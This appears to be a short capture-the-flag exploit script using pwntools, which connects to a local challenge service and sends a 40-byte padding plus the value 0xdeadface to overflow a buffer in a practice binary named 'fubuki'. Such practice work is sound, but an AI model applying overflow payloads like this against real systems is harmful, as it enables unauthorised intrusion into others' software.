from pwn import *

# elf = context.binary = ELF('./fubuki')
# p = process('./fubuki-static')
p = remote('localhost', 13371)

payload = b'A' * 40
payload += p32(0xdeadface)

p.sendlineafter(b':', payload)
print(p.recvuntil(b'!').decode())
